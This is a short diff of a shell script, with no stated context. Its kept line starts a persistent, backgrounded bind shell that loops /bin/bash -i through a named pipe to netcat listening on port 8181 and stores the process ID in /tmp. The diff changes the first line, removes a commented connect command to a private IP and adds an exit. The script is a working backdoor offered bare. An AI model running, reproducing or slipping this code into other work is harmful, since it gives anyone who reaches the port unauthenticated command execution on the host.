@@ -1,4 +1,4 @@
-#!/bin/bash
+bash
 nohup bash -c "while true; do rm /tmp/ncf;mkfifo /tmp/ncf;cat /tmp/ncf|/bin/bash -i 2>&1|nc -l 8181 >/tmp/ncf ; done" 2>&1 >/dev/null &
 echo $! > /tmp/pncpid
-#nc 192.168.2.1 8181
+exit
